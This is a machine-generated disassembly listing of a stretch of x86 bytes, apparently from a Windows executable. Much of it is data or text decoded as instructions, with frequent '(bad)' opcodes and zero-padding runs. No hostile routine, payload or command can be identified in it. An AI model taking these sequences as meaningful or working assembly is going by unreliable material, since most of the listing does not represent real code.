  42190c:	lea    ecx,[edi+0x30]
  42190f:	dec    esi
  421910:	lahf   
  421911:	dec    edi
  421912:	cmp    eax,0x3c4fa04e
  421917:	dec    esi
  421918:	xor    BYTE PTR [esi+0x3f],cl
  42191b:	dec    esi
  42191c:	pop    esp
  42191d:	in     eax,dx
  42191e:	pop    edi
  42191f:	loop   0x421990
  421921:	repnz outs dx,BYTE PTR ds:[esi]
  421923:	repz jle 0x421929
  421926:	jns    0x421928
  421928:	jle    0x42193d
  42192a:	jns    0x42193c
  42192c:	cmp    al,0x4e
  42192e:	jg     0x42197e
  421930:	xor    BYTE PTR [esi-0x65],cl
  421933:	dec    edi
  421934:	xor    cl,BYTE PTR [esi-0x80]
  421937:	dec    edi
  421938:	cmp    al,0x4e
  42193a:	lods   eax,DWORD PTR ds:[esi]
  42193b:	dec    edi
  42193c:	cmp    ecx,DWORD PTR [esi+0x30]
  42193f:	dec    esi
  421940:	inc    ebp
  421941:	dec    esi
  421942:	pop    esp
  421943:	or     eax,0x126f025f
  421948:	outs   dx,BYTE PTR ds:[esi]
  421949:	adc    edi,DWORD PTR [esi+0x23]
  42194c:	jns    0x42196e
  42194e:	aas    
  42194f:	dec    esi
  421950:	add    BYTE PTR [eax],al
  421952:	ficom  DWORD PTR [edi]
  421954:	inc    edx
  421955:	add    dh,cl
  421957:	sbb    DWORD PTR [edx+0x0],eax
  42195a:	(bad)  
  42195b:	sbb    DWORD PTR [edx+0x0],eax
  42195e:	jle    0x42197b
  421960:	inc    edx
  421961:	add    dl,ch
  421963:	sbb    al,BYTE PTR [edx+0x0]
  421966:	outs   dx,BYTE PTR ds:[esi]
  421967:	sbb    eax,DWORD PTR [edx+0x0]
  42196a:	mov    dh,0x19
  42196c:	inc    edx
  42196d:	add    BYTE PTR [edx+0x6a004219],bh
  421973:	sbb    eax,DWORD PTR [edx+0x0]
  421976:	push   ds
  421977:	sbb    al,BYTE PTR [edx+0x0]
  42197a:	or     eax,0x36f89ca9
  42197f:	mov    edx,0x19d2f89c
  421984:	inc    edx
  421985:	add    BYTE PTR [edx-0x49ffbde6],ah
  42198b:	sbb    al,BYTE PTR [edx+0x0]
  42198e:	ret    0x421a
  421991:	add    dl,dl
  421993:	sbb    al,BYTE PTR [edx+0x0]
  421996:	or     bl,BYTE PTR [edx]
  421998:	inc    edx
  421999:	add    dh,dl
  42199b:	pop    ss
  42199c:	inc    edx
  42199d:	add    BYTE PTR [edx],ch
  42199f:	sbb    al,BYTE PTR [edx+0x0]
  4219a2:	sbb    bl,BYTE PTR [edx]
  4219a4:	inc    edx
  4219a5:	add    BYTE PTR [edx-0x49ffbde5],al
  4219ab:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  4219b2:	ficomp WORD PTR [ecx]
  4219b4:	inc    edx
  4219b5:	add    BYTE PTR [esp+ebx*1],dl
  4219b8:	push   ss
  4219b9:	or     DWORD PTR [eax],0x7050d
  4219bf:	add    BYTE PTR [eax+0x0],al
  4219c2:	cmp    al,BYTE PTR [edx+0x3e]
  4219c5:	ds enter 0x4279,0x0
  4219ca:	ins    DWORD PTR es:[edi],dx
  4219cb:	push   ebp
  4219cc:	inc    esp
  4219cd:	imul   ecx,DWORD PTR [eax],0x86275fa
  4219d3:	in     eax,dx
  4219d4:	inc    BYTE PTR [edi]
  4219d6:	aas    
  4219d7:	cli    
  4219d8:	mov    ds:0x4219c605,eax
  4219dd:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219e3:	xchg   esi,eax
  4219e4:	pushf  
  4219e5:	clc    
  4219e6:	mov    ah,0x95
  4219e8:	pushf  
  4219e9:	clc    
  4219ea:	mov    ebx,0xbaf89c95
  4219ef:	xchg   ebp,eax
  4219f0:	pushf  
  4219f1:	clc    
  4219f2:	mov    ecx,0xb8f89c95
  4219f7:	xchg   ebp,eax
  4219f8:	pushf  
  4219f9:	clc    
  4219fa:	mov    edi,0xbef89c95
  4219ff:	xchg   ebp,eax
  421a00:	pushf  
  421a01:	clc    
  421a02:	mov    ebp,0xa6f89c95
  421a07:	xchg   ebp,eax
  421a08:	pushf  
  421a09:	clc    
  421a0a:	jmp    0x4217:0xce6003f9
  421a11:	add    BYTE PTR [eax+eax*2+0x42],ch
  421a15:	add    BYTE PTR [ebx+0x77],dl
  421a18:	jbe    0x421a6a
  421a1a:	mov    dh,0x85
  421a1c:	pushf  
  421a1d:	clc    
  421a1e:	sbb    ecx,ebp
  421a20:	push   eax
  421a21:	pop    es
  421a22:	dec    eax
  421a23:	or     al,BYTE PTR [eax]
  421a25:	add    dl,cl
  421a27:	pop    ss
  421a28:	inc    edx
  421a29:	add    BYTE PTR [ebx],bl
  421a2b:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a5e:	ins    BYTE PTR es:[edi],dx
  421a5f:	inc    eax
  421a60:	inc    edx
  421a61:	add    BYTE PTR [esi+0x66f89c85],dh
  421a67:	add    BYTE PTR [edx+0x0],ch
  421a6a:	add    BYTE PTR [si+0x0],ah
  421a6e:	push   0x64006700
  421a73:	add    BYTE PTR [esi+0x0],ah
  421a76:	push   0x0
  421a78:	push   0x66006400
  421a7d:	add    BYTE PTR [edi+0x0],ah
  421a80:	push   0x0
  421a82:	push   0x66006700
  421a87:	add    BYTE PTR [eax+0x0],ch
  421a8a:	add    BYTE PTR [bp+0x0],ah
  421a8e:	push   0x66006700
	...
  421a9b:	add    BYTE PTR [eax],al
  421a9d:	add    BYTE PTR [edi+0x5c],ch
  421aa0:	inc    eax
  421aa1:	add    BYTE PTR [ebp-0x5db060b1],ah
  421aa7:	dec    edi
  421aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aa9:	dec    edi
  421aaa:	lahf   
  421aab:	dec    edi
  421aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aad:	dec    edi
  421aae:	ins    DWORD PTR es:[edi],dx
  421aaf:	dec    esi
  421ab0:	bound  ecx,QWORD PTR [esi+0x30]
  421ab3:	dec    esi
  421ab4:	add    BYTE PTR [eax],al
  421ab6:	cdq    
  421ab7:	dec    edi
  421ab8:	pushf  
  421ab9:	dec    edi
  421aba:	fwait
  421abb:	dec    edi
  421abc:	ins    DWORD PTR es:[edi],dx
  421abd:	dec    esi
  421abe:	bound  ecx,QWORD PTR [esi+0x30]
  421ac1:	dec    esi
  421ac2:	scas   eax,DWORD PTR es:[edi]
  421ac3:	dec    edi
  421ac4:	lods   eax,DWORD PTR ds:[esi]
  421ac5:	dec    edi
  421ac6:	lahf   
  421ac7:	dec    edi
  421ac8:	mov    ds:0x624e6d4f,al
  421acd:	dec    esi
  421ace:	xor    BYTE PTR [esi+0x0],cl
  421ad1:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ad7:	dec    edi
  421ad8:	test   eax,0xa04f934f
  421add:	dec    edi
  421ade:	fwait
  421adf:	dec    edi
  421ae0:	xor    BYTE PTR [esi+0x0],cl
  421ae3:	add    BYTE PTR [eax],al
  421ae5:	add    BYTE PTR [eax],al
  421ae7:	add    BYTE PTR [eax],al
  421ae9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421af0:	mov    WORD PTR [ebp-0x32734274],gs
  421af6:	mov    ebp,ds
  421af8:	mov    ebp,gs
  421afa:	mov    ebp,?
  421afc:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421b02:	mov    WORD PTR ds:0x6d8c5d8c,?
  421b08:	mov    WORD PTR [edx-0x74],?
  421b0b:	jae    0x421a99
  421b0d:	jo     0x421a9b
  421b0f:	jno    0x421a9d
  421b11:	jbe    0x421a9f
  421b13:	ja     0x421aa1
  421b15:	je     0x421aa3
  421b17:	jne    0x421aa5
  421b19:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421b20:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421b26:	lods   al,BYTE PTR ds:[esi]
  421b27:	jge    0x421ae5
  421b29:	jge    0x421ac9
  421b2b:	(bad)  
  421b2c:	jns    0x421ba1
  421b2e:	mov    ecx,0x7d738cb1
  421b33:	ins    DWORD PTR es:[edi],dx
  421b34:	enter  0x9fc6,0x26
  421b38:	jb     0x421b3d
  421b3a:	test   eax,0xb956bb17
  421b3f:	hlt    
  421b40:	test   al,0x37
  421b42:	test   al,0x7e
  421b44:	fnstenv [ecx-0x6a]
  421b47:	mov    cl,0x6a
  421b49:	push   0xffffffce
  421b4b:	or     BYTE PTR [edx],bl
  421b4d:	xlat   BYTE PTR ds:[ebx]
  421b4e:	out    dx,eax
  421b4f:	add    eax,0x9321d7aa
  421b54:	scas   al,BYTE PTR es:[edi]
  421b55:	adc    DWORD PTR [esi],esp
  421b57:	jge    0x421b7c
  421b59:	fidiv  WORD PTR [edi]
  421b5b:	leave  
  421b5c:	hlt    
  421b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b5e:	cmp    ax,0x1fc8
  421b62:	mov    dh,cl
  421b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b65:	(bad)  
  421b66:	and    DWORD PTR [eax],ebx
  421b68:	and    DWORD PTR [ecx-0x18],esi
  421b6b:	(bad)  [ebx+0x7]
  421b6e:	cmc    
  421b6f:	enter  0x301a,0x14
  421b73:	inc    eax
  421b74:	inc    edx
  421b75:	add    BYTE PTR [ecx+0x66],dh
  421b78:	jp     0x421be8
  421b7a:	mov    esi,0x22004219
  421b7f:	sbb    al,BYTE PTR [edx+0x0]
  421b82:	or     ch,ch
  421b84:	adc    al,BYTE PTR [edi]
  421b86:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b8d:	ins    BYTE PTR es:[edi],dx
  421b8e:	push   0x49657557
  421b93:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421b99:	push   edi
  421b9a:	jp     0x421c16
  421b9c:	dec    ebp
  421b9d:	push   esi
  421b9e:	arpl   WORD PTR gs:[ecx+0x45],si
  421ba2:	dec    edx
  421ba3:	dec    esi
  421ba4:	data16 ja 0x421bf5
  421ba7:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421bc2:	inc    ebp
  421bc3:	push   edx
  421bc4:	jb     0x421c3a
  421bc6:	inc    esi
  421bc7:	je     0x421c0a
  421bc9:	inc    esi
  421bca:	jae    0x421c42
  421bcc:	dec    ebx
  421bcd:	gs dec ecx
  421bcf:	dec    ebp
  421bd0:	dec    ebp
  421bd1:	pop    edx
  421bd2:	jp     0x421c2e
  421bd4:	jbe    0x421c1c
  421bd6:	pop    ecx
  421bd7:	jo     0x421c51
  421bd9:	inc    edi
  421bda:	gs ins BYTE PTR es:[edi],dx
  421bdc:	dec    esp
  421bdd:	js     0x421c47
  421bdf:	inc    edx
  421be0:	js     0x421c28
  421be2:	dec    eax
  421be3:	inc    ebp
  421be4:	inc    esp
  421be5:	inc    esp
  421be6:	push   ecx
  421be7:	dec    edx
  421be8:	ins    BYTE PTR es:[edi],dx
  421be9:	dec    ebx
  421bea:	jbe    0x421c5a
  421bec:	pop    eax
  421bed:	jbe    0x421c3a
  421bef:	inc    ecx
  421bf0:	fs gs jno 0x421c61
  421bf4:	push   ebx
  421bf5:	inc    ecx
  421bf6:	add    BYTE PTR [eax],al
  421bf8:	inc    ebx
  421bf9:	outs   dx,BYTE PTR ds:[esi]
  421bfa:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421bfe:	push   edx
  421bff:	push   ecx
  421c00:	push   0x74000064
  421c05:	jne    0x421c7c
  421c07:	ins    DWORD PTR es:[edi],dx
  421c08:	push   ecx
  421c09:	push   eax
  421c0a:	jo     0x421c86
  421c0c:	addr16 jo 0x421c65
  421c0f:	pop    eax
  421c10:	add    BYTE PTR [eax],al
  421c12:	push   ecx
  421c13:	pop    ecx
  421c14:	inc    ebx
  421c15:	inc    edx
  421c16:	outs   dx,BYTE PTR ds:[esi]
  421c17:	popa   
  421c18:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421c1c:	jne    0x421c8c
  421c1e:	dec    ebx
  421c1f:	je     0x421c84
  421c21:	bound  esp,QWORD PTR [edi+0x0]
  421c24:	jns    0x421c6b
  421c26:	bound  ebp,QWORD PTR [ecx+0x46]
  421c29:	dec    ecx
  421c2a:	ja     0x421c71
  421c2c:	dec    eax
  421c2d:	inc    ebp
  421c2e:	inc    edx
  421c2f:	push   ebx
  421c30:	add    BYTE PTR [eax],al
  421c32:	outs   dx,DWORD PTR ds:[esi]
  421c33:	inc    edi
  421c34:	dec    esi
  421c35:	outs   dx,DWORD PTR ds:[esi]
  421c36:	pop    ecx
  421c37:	inc    edi
  421c38:	jb     0x421c81
  421c3a:	jns    0x421cb2
  421c3c:	inc    ecx
  421c3d:	pop    eax
  421c3e:	dec    esp
  421c3f:	add    BYTE PTR [eax+0x48],bh
  421c42:	bound  edx,QWORD PTR [ebx+0x43]
  421c45:	pop    eax
  421c46:	outs   dx,DWORD PTR ds:[esi]
  421c47:	push   0x4355
  421c4c:	dec    esp
  421c4d:	ins    BYTE PTR es:[edi],dx
  421c4e:	inc    edx
  421c4f:	push   0x76666a73
  421c54:	inc    edx
  421c55:	jo     0x421c57
  421c57:	add    BYTE PTR [eax],al
  421c59:	add    BYTE PTR [edi+0x6d],ah
  421c5c:	je     0x421ca5
  421c5e:	ins    BYTE PTR es:[edi],dx
  421c5f:	jae    0x421ccb
  421c61:	inc    esi
  421c62:	ins    DWORD PTR es:[edi],dx
  421c63:	je     0x421cbb
  421c65:	push   0x56584178
  421c6a:	push   ebx
  421c6b:	addr16 dec edx
  421c6d:	jo     0x421ce1
  421c6f:	js     0x421ce0
  421c71:	pop    eax
  421c72:	dec    ebx
  421c73:	push   esp
  421c74:	dec    esp
  421c75:	jns    0x421cc2
  421c77:	js     0x421cf1
  421c79:	outs   dx,BYTE PTR ds:[esi]
  421c7a:	pop    ecx
  421c7b:	jae    0x421ceb
  421c7d:	push   0x43644448
  421c82:	arpl   WORD PTR [edx+0x55],sp
  421c85:	push   0x42504e67
  421c8a:	push   ebp
  421c8b:	je     0x421d02
  421c8d:	addr16 dec edi
  421c8f:	dec    esp
  421c90:	inc    edx
  421c91:	ins    DWORD PTR es:[edi],dx
  421c92:	inc    esi
  421c93:	inc    esi
  421c94:	inc    esi
  421c95:	arpl   WORD PTR [edx+0x47],bx
  421c98:	push   ebp
  421c99:	inc    ebx
  421c9a:	popa   
  421c9b:	push   edx
  421c9c:	dec    esp
  421c9d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421ca4:	push   ecx
  421ca5:	push   ebx
  421ca6:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421cad:	dec    edx
  421cae:	jns    0x421d19
  421cb0:	push   edx
  421cb1:	inc    ebx
  421cb2:	jo     0x421d29
  421cb4:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421cb8:	fs push ebx
  421cba:	inc    ebx
  421cbb:	push   ebp
  421cbc:	push   eax
  421cbd:	ja     0x421cfa
  421cbf:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421cc3:	mov    ebp,0xa53ddffb
  421cc8:	js     0x421c83
  421cca:	adc    al,0x7e
  421ccc:	mov    edx,0x1d5b6da
  421cd1:	add    BYTE PTR [ecx+0x0],ah
  421cd4:	add    BYTE PTR [eax],al
  421cd6:	sbb    eax,DWORD PTR [eax]
  421cd8:	outs   dx,DWORD PTR ds:[esi]
  421cd9:	pop    edi
  421cda:	test   al,0x38
  421cdc:	ret    
  421cdd:	pop    ss
  421cde:	test   BYTE PTR [edx-0x5e918647],ah
  421ce4:	movd   DWORD PTR [esi-0x65],mm4
  421ce8:	mov    eax,ds:0x5d6475f0
  421ced:	push   ebp
  421cee:	mov    eax,0x3819035
  421cf3:	xlat   BYTE PTR ds:[ebx]
  421cf4:	fild   DWORD PTR [ebx]
  421cf6:	jge    0x421d5b
  421cf8:	dec    edi
  421cf9:	adc    esi,ebx
  421cfb:	mov    esi,0x64d6c9a8
  421d00:	sbb    ch,BYTE PTR [esi]
  421d02:	js     0x421d20
  421d04:	cwde   
  421d05:	xor    DWORD PTR [ecx],ebp
  421d07:	fimul  WORD PTR [esi]
  421d09:	push   cs
  421d0a:	sbb    ecx,0xffffffa3
  421d0d:	dec    esp
  421d0e:	xchg   esi,eax
  421d0f:	add    ebp,DWORD PTR [eax-0x57]
  421d12:	push   esp
  421d13:	(bad)  
  421d14:	sbb    DWORD PTR [esi+0x37],edx
  421d17:	mov    dl,0xd6
  421d19:	cwde   
  421d1a:	cdq    
  421d1b:	hlt    
  421d1c:	xchg   edi,eax
  421d1d:	in     al,dx
  421d1e:	mov    ch,0x1b
  421d20:	(bad)  
  421d21:	lock push ebx
  421d23:	dec    ebp
  421d24:	push   ecx
  421d25:	xor    ah,cl
  421d27:	xchg   BYTE PTR [edx-0x4d],ah
  421d2a:	aaa    
  421d2b:	mov    ds:0xf1bb8c4e,eax
  421d30:	xor    DWORD PTR [ecx-0x2],ebx
  421d33:	dec    esp
  421d34:	(bad)
  421d37:	add    BYTE PTR [eax],al
  421d39:	add    BYTE PTR [eax],al
  421d3b:	add    BYTE PTR [eax],al
  421d3d:	add    BYTE PTR [eax],ch
  421d3f:	mov    dl,0xa5
  421d41:	push   edx
  421d42:	mov    edi,0x7cfaff57
  421d47:	xlat   BYTE PTR fs:[ebx]
  421d49:	push   esi
  421d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d4b:	(bad)  
  421d4c:	in     eax,0x41
  421d4e:	pop    ss
  421d4f:	(bad)  
  421d50:	add    DWORD PTR [eax],eax
  421d52:	popa   
  421d53:	add    BYTE PTR [eax],al
  421d55:	add    ah,dl
  421d57:	xor    ah,ah
  421d59:	add    edi,DWORD PTR [esi+0x75]
  421d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d5d:	xchg   ebx,eax
  421d5e:	sub    edx,DWORD PTR [ebx+0x59742d5e]
  421d64:	sti    
  421d65:	sbb    ebx,edi
  421d67:	std    
  421d68:	pop    ecx
  421d69:	mov    dl,0x4a
  421d6b:	adc    DWORD PTR [eax],ebx
  421d6d:	and    DWORD PTR [ebp-0x74],edi
  421d70:	out    0xd8,eax
  421d72:	xchg   edx,eax
  421d73:	bound  ecx,QWORD PTR [edi+esi*1]
  421d76:	dec    esi
  421d77:	test   eax,0xba29223c
  421d7c:	fst    DWORD PTR es:[edi+0x4]
  421d80:	mov    ds:0x3cf80d2c,al
  421d85:	fadd   DWORD PTR [esi-0x6a3ee0fa]
  421d8b:	add    bh,ah
  421d8d:	lahf   
  421d8e:	fstp   QWORD PTR [edx*8-0x26774f98]
  421d95:	jb     0x421d71
  421d97:	(bad)  
  421d98:	sbb    eax,0x7116ac2f
  421d9d:	mov    eax,0xe65c027b
  421da2:	ds cmc 
  421da4:	mov    DWORD PTR [edx],eax
  421da6:	mov    ?,WORD PTR [ebx]
  421da8:	fwait
  421da9:	iret   
  421daa:	dec    eax
  421dab:	popf   
  421dac:	mov    edx,0xa21cabf3
  421db1:	fst    QWORD PTR [esi+0x10]
  421db4:	mov    eax,0xcc69
  421db9:	add    BYTE PTR [eax],al
  421dbb:	add    BYTE PTR [eax],al
  421dbd:	add    BYTE PTR [ebx-0x7e80ab],dh
  421dc3:	stos   DWORD PTR es:[edi],eax
  421dc4:	push   DWORD PTR [edi-0x42]
  421dc7:	xchg   esi,eax
  421dc8:	push   0x87168757
  421dcd:	aad    0x78
  421dcf:	(bad)  
  421dd0:	add    DWORD PTR [eax],eax
  421dd2:	popa   
  421dd3:	add    BYTE PTR [eax],al
  421dd5:	add    BYTE PTR [ebx-0x47c1deb8],ah
  421ddb:	mov    ds:0xcea0c8f5,eax
  421de0:	dec    esp
  421de1:	sbb    esi,DWORD PTR [eax]
  421de3:	dec    ecx
  421de4:	sbb    dl,bl
  421de6:	ficomp WORD PTR [ebx+edi*8+0x52]
  421dea:	xor    cl,BYTE PTR [ebx-0x1e]
  421ded:	dec    esp
  421dee:	sbb    BYTE PTR ds:0x7d8609cc,ah
  421df4:	stos   BYTE PTR es:[edi],al
  421df5:	xchg   esi,eax
  421df6:	test   DWORD PTR [ebx+0x56],esp
  421df9:	xor    esp,DWORD PTR [ecx-0x24]
  421dfc:	(bad)  
  421dfd:	mov    eax,0x92f21a43
  421e02:	mov    DWORD PTR [ebx],edi
  421e04:	stos   BYTE PTR es:[edi],al
  421e05:	and    BYTE PTR [edi-0x26cc1bbe],bl
  421e0b:	jmp    0x8d84278d
  421e10:	mov    WORD PTR [edi+0x5865b961],gs
  421e16:	dec    eax
  421e17:	popf   
  421e18:	pop    es
  421e19:	dec    eax
  421e1a:	jge    0x421dc3
  421e1c:	rcl    DWORD PTR [ebp+0x5],cl
  421e1f:	cmp    al,0x89
  421e21:	es cs pop edi
  421e24:	cmp    ah,BYTE PTR es:[eax-0x2b]
  421e28:	mov    ds:0x639c285d,eax
  421e2d:	push   edi
  421e2e:	cmp    ebp,edx
  421e30:	xor    eax,0x999eacb8
  421e35:	add    BYTE PTR ds:0x0,0x0
  421e3c:	add    BYTE PTR [eax],al
  421e3e:	cmp    dh,dl
  421e40:	cmp    ah,BYTE PTR [esi+edi*8]
  421e43:	in     al,dx
  421e44:	fimul  WORD PTR ds:[edi-0x4e53942b]
  421e4b:	push   esp
  421e4c:	call   0x218f7dd
  421e51:	add    BYTE PTR [ecx+0x0],ah
  421e54:	add    BYTE PTR [eax],al
  421e56:	jns    0x421e84
  421e58:	mov    bh,0xec
  421e5a:	pop    ecx
  421e5b:	(bad)  
  421e5d:	adc    DWORD PTR [edx+0x6f],0xaed38321
  421e64:	(bad)  
  421e65:	adc    al,0x2b
  421e67:	cli    
  421e68:	adc    DWORD PTR [eax],0x1f190cba
  421e6e:	and    dl,BYTE PTR [ecx]
  421e70:	call   0xad87cc80
  421e75:	sub    BYTE PTR [esi+ebx*8+0xc],ch
  421e79:	pop    ds
  421e7a:	addr16 push eax
  421e7c:	xor    BYTE PTR [edx+0x46],dh
  421e7f:	dec    ebp
  421e80:	loopne 0x421eea
  421e82:	pop    eax
  421e83:	repz pop ebx
  421e85:	enter  0x99d7,0xf2
  421e89:	rcl    DWORD PTR [edi-0x7c],cl
  421e8c:	lock or DWORD PTR [edi+eiz*2+0x37],esp
  421e91:	inc    esi
  421e92:	xchg   ecx,eax
  421e93:	push   esi
  421e94:	retf   
  421e95:	icebp  
  421e96:	cmp    esi,esi
  421e98:	(bad)  
  421e9a:	in     eax,0xd6
  421e9c:	popa   
  421e9d:	(bad)  [eax-0x328e0ef7]
  421ea3:	enter  0x4200,0xf0
  421ea7:	pop    es
  421ea8:	xor    eax,0x2fe9c0bc
  421ead:	lock or al,0xfb
  421eb0:	push   esp
  421eb1:	dec    ebp
  421eb2:	mov    DWORD PTR [si+0x6c40],esi
  421eb7:	add    BYTE PTR [eax],al
  421eb9:	add    BYTE PTR [eax],al
  421ebb:	add    BYTE PTR [eax],al
  421ebd:	add    cl,bl
  421ebf:	mov    dh,0x66
  421ec1:	sbb    ebp,DWORD PTR [edi-0x25]
  421ec4:	std    
  421ec5:	neg    BYTE PTR [esi]
  421ec7:	sub    esp,DWORD PTR [ebx-0x23]
  421eca:	push   0x3a08d42c
  421ecf:	xlat   BYTE PTR ds:[ebx]
  421ed0:	add    DWORD PTR [eax],eax
  421ed2:	popa   
  421ed3:	add    BYTE PTR [eax],al
  421ed5:	add    BYTE PTR [esi],bl
  421ed7:	sbb    ch,cl
  421ed9:	xchg   DWORD PTR [edx+0x5a],esp
  421edc:	mov    ds:0x51b57bb0,eax
  421ee1:	outs   dx,DWORD PTR ds:[esi]
  421ee2:	retf   0x922c
  421ee5:	pop    edx
  421ee6:	jmp    0xa34341a5
  421eeb:	xchg   ebp,eax
  421eec:	iret   
  421eed:	cld    
  421eee:	fs clc 
  421ef0:	in     eax,0x7a
  421ef2:	aad    0x39
  421ef4:	cmp    al,0xc2
  421ef6:	pop    es
  421ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef8:	xchg   edi,eax
  421ef9:	in     eax,0xec
  421efb:	or     ah,BYTE PTR [edx+0x58]
  421efe:	mov    ah,0x66
  421f00:	jmp    0x52a8f1e
  421f05:	dec    edi
  421f06:	mov    ecx,0x23afeda7
  421f0b:	pop    ebp
  421f0c:	repz fwait
  421f0e:	push   ebp
  421f0f:	test   cl,ah
  421f11:	dec    edi
  421f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f13:	or     edx,eax
  421f15:	jl     0x421ee2
  421f17:	lock loop 0x421f5e
  421f1a:	dec    ebp
  421f1b:	push   eax
  421f1c:	adc    DWORD PTR [edi-0x47],ecx
  421f1f:	jbe    0x421f73
  421f21:	clc    
  421f22:	in     eax,dx
  421f23:	test   eax,0x5f9f52c9
  421f28:	add    BYTE PTR [edx+0x59],al
  421f2b:	pop    ebp
  421f2c:	jg     0x421f54
  421f2e:	call   0x4012ec2b
  421f33:	mov    dh,0x86
  421f35:	jne    0x421edd
  421f37:	add    BYTE PTR [eax],al
  421f39:	add    BYTE PTR [eax],al
  421f3b:	add    BYTE PTR [eax],al
  421f3d:	add    dl,bl
  421f3f:	xor    dl,BYTE PTR [edi-0x20500076]
  421f45:	jb     0x421f4a
  421f47:	inc    ebp
  421f48:	mov    ds:0x9af2535c,eax
  421f4d:	push   eax
  421f4e:	fwait
  421f4f:	xlat   BYTE PTR ds:[ebx]
  421f50:	add    DWORD PTR [eax],eax
  421f52:	popa   
  421f53:	add    BYTE PTR [eax],al
  421f55:	add    BYTE PTR [eax-0x3839bc2],dh
  421f5b:	or     BYTE PTR fs:[esi+0x68],dh
  421f5f:	mov    DWORD PTR [edi+0x44],ecx
  421f62:	add    dl,BYTE PTR [ebp+0x1473ba5e]
  421f68:	adc    bh,ah
  421f6a:	push   0x75
  421f6c:	mov    al,0x0
  421f6e:	std    
  421f6f:	inc    eax
  421f70:	outs   dx,DWORD PTR ds:[esi]
  421f71:	loope  0x421fd2
  421f73:	pop    ds
  421f74:	imul   edi,DWORD PTR [edi+ebx*8],0x4
  421f78:	cs (bad) 
  421f7a:	fwait
  421f7b:	nop
  421f7c:	mov    al,ds:0x5e98c88d
  421f81:	xor    cl,al
  421f83:	sbb    al,0x97
  421f85:	cmp    al,0xab
  421f87:	ret    
  421f88:	fmulp  st(3),st
  421f8a:	push   es
  421f8b:	pop    esi
  421f8c:	imul   edi,DWORD PTR [ebp-0x5a],0xffffff81
  421f90:	aas    
  421f91:	fdivr  QWORD PTR [edx+0x4c]
  421f94:	xchg   BYTE PTR [ecx],cl
  421f96:	adc    BYTE PTR [edi-0x6d],dh
  421f99:	(bad)  
  421f9a:	pxor   mm3,QWORD PTR [eax]
  421f9d:	xchg   DWORD PTR [eax],esi
  421f9f:	and    dl,bh
  421fa1:	jl     0x422021
  421fa3:	fldenv ds:0xb2470720
  421fa9:	stos   DWORD PTR es:[edi],eax
  421faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fab:	mov    al,ds:0x90de4d7d
  421fb0:	cdq    
  421fb1:	pop    ecx
  421fb2:	popf   
  421fb3:	add    al,0xb1
  421fb5:	rol    BYTE PTR [esi+0x0],0x0
  421fbc:	add    BYTE PTR [eax],al
  421fbe:	dec    eax
  421fbf:	in     al,0x3
  421fc1:	fwait
  421fc2:	scas   eax,DWORD PTR es:[edi]
  421fc3:	(bad)  
  421fc4:	fdiv   st,st(7)
  421fc6:	pop    esi
  421fc7:	sub    BYTE PTR [eax+0x6e5f6d8f],bl
  421fcd:	call   0x61:0x1d7fc
  421fd4:	add    BYTE PTR [eax],al
  421fd6:	sbb    esp,DWORD PTR [eax-0x2c]
  421fd9:	xor    bl,BYTE PTR [ebx+esi*1-0x80]
  421fdd:	je     0x421fa3
  421fdf:	jge    0x421f78
  421fe1:	pop    ecx
  421fe2:	pushf  
  421fe3:	adc    edx,DWORD PTR [esi]
  421fe5:	push   ss
  421fe6:	std    
  421fe7:	cmp    eax,0xb20aeb85
  421fec:	imul   ebp,DWORD PTR [ecx-0x5f],0x39
  421ff0:	jle    0x422001
  421ff2:	pop    dx
  421ff4:	dec    ebp
  421ff5:	std    
  421ff6:	push   ebp
  421ff7:	cs mov ah,0x27
  421ffa:	mov    al,0x91
  421ffc:	lea    esi,[ebp+0x1fde4b5]
  422002:	js     0x422041
  422004:	inc    ebx
  422005:	out    dx,eax
  422006:	lds    edi,FWORD PTR fs:[esp+ecx*4+0x7635ee06]
  42200e:	dec    edx
  42200f:	jle    0x421fb2
  422011:	hlt    
  422012:	xor    ebp,DWORD PTR [ebx-0x1db7a26]
  422018:	xor    al,0x37
  42201a:	push   ebx
  42201b:	ins    BYTE PTR es:[edi],dx
  42201c:	iret   
  42201d:	jo     0x422087
  42201f:	mov    edi,0xc1297a91
  422024:	pop    edx
  422025:	div    BYTE PTR [ecx+0x5a16d0fc]
  42202b:	add    DWORD PTR [eax+0x1d199e13],0xffffffd6
  422032:	jo     0x421ff9
  422034:	mov    dl,0xa7
  422036:	cmp    eax,0x0
  42203b:	add    BYTE PTR [eax],al
  42203d:	add    BYTE PTR [edx+0x4],dl
  422040:	mov    ds:0x72a6f682,al
  422045:	aam    0x6d
  422047:	xor    dh,BYTE PTR [edx]
  422049:	and    eax,0x9a8fa3ee
  42204e:	pop    ebp
  42204f:	fadd   DWORD PTR [ecx]
  422051:	add    BYTE PTR [ecx+0x0],ah
  422054:	add    BYTE PTR [eax],al
  422056:	jae    0x422053
  422058:	std    
  422059:	inc    esp
  42205a:	fucomip st,st(0)
  42205c:	xchg   esp,eax
  42205d:	jg     0x422099
  42205f:	jl     0x4220d8
  422061:	pop    edi
  422062:	test   BYTE PTR [ebx-0x5a],ch
